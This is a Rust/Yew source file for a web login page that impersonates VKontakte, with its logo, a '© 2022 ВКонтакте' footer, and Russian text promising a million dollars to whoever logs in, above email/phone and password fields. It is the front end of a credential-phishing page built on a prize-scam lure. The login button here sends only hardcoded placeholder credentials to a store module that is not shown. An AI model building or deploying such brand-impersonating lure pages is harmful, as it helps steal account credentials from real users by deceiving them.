use yew::prelude::*;

mod stores;

struct App;

use stores::Store;

impl Component for App {
    type Message = ();
    type Properties = ();

    fn create(_ctx: &Context<Self>) -> Self {
        Self
    }

    fn view(&self, _ctx: &Context<Self>) -> Html {
        html! {
            <div class={"container is-flex is-display-height is-all-content-centered"}>
                <div class={"container is-max-desktop columns box auth-form"}>
                    <div class={"column is-flex is-all-content-centered left-part"}>
                        <div class={"content is-flex is-flex-direction-column is-align-items-center is-justify-content-space-between is-full-height"}>
                            <svg width="50" height="50" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 14.4C0 7.61 0 4.22 2.1 2.1 4.23 0 7.62 0 14.4 0h1.2c6.79 0 10.18 0 12.3 2.1C30 4.23 30 7.62 30 14.4v1.2c0 6.79 0 10.18-2.1 12.3C25.77 30 22.38 30 15.6 30h-1.2c-6.79 0-10.18 0-12.3-2.1C0 25.77 0 22.38 0 15.6v-1.2Z" fill="#07F"></path><path d="M15.96 21.61c-6.84 0-10.74-4.68-10.9-12.48H8.5c.11 5.72 2.63 8.14 4.63 8.64V9.13h3.23v4.93c1.97-.21 4.05-2.46 4.75-4.94h3.22a9.53 9.53 0 0 1-4.38 6.23 9.87 9.87 0 0 1 5.13 6.26h-3.55c-.76-2.37-2.66-4.21-5.17-4.46v4.46h-.39Z" fill="#fff"></path></svg>
                            <p style="text-align: center">{"Для того чтобы забрать миллион долларов, пройдите авторизацию"}</p>
                            <p style="font-weight: bold">{"© 2022 ВКонтакте"}</p>
                        </div>
                    </div>
                    <div class={"column is-flex is-all-content-centered right-side"}>
                        <div></div>
                        <div class={"top-inputs block"}>
                            <p class="control has-icons-left has-icons-right">
                                <input class="input is-rounded" type="email" placeholder="Email или номер телефона" />
                                <span class="icon is-small is-left">
                                  <i class="fas fa-envelope"></i>
                                </span>
                              </p>
                              <p class="control has-icons-left">
                                <input class="input is-rounded" type="password" placeholder="Пароль" />
                                <span class="icon is-small is-left">
                                  <svg style="fill: #dbdbdb;" width=15 height=15 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M144 144v48H304V144c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192V144C80 64.5 144.5 0 224 0s144 64.5 144 144v48h16c35.3 0 64 28.7 64 64V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V256c0-35.3 28.7-64 64-64H80z"/></svg>
                                </span>
                              </p>
                        </div>
                        <button
                            class="button is-link is-rounded submit-button"
                            onclick={move |_| {Store::login("myemail@example.com".into(), "supersecretpassword".into());}}
                        >
                            {"Войти"}
                        </button>
                    </div>
                    <div class={"divider"} />
                </div>
            </div>
        }
    }
}

fn main() {
    yew::Renderer::<App>::new().render();
}
